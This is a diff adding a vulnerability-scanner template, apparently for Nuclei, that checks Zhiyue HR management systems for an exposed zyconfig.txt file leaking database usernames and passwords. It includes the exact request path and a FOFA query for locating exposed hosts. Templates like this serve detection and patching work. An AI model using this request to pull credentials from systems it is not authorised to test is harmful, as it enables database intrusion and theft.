@@ -1,0 +1,30 @@
+id: zyehr-zyconfig-disclosure
+info:
+  name: 智跃人力资源管理系统 zyconfig.txt 存在敏感信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: 智跃人力资源管理系统是东莞市智跃软件科技有限公司研发的一个为企业提供数字化管理解决方案软件系统，它集成了人事、考勤、薪资等多个功能模块，智跃人力资源管理系统zyconfig.txt 敏感信息泄露，攻击者可获取系统数据库敏感信息
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/wax17lyoax2erhzd
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="ZY.LOGO.64.png"
+    tips:
+    repair:
+    version:
+  tags: zyehr,disclosure
+
+http:
+  - raw:
+      - |
+        GET /resource/servs/file/zyconfig.txt HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'User','PassWord','Connection')
+        condition: and
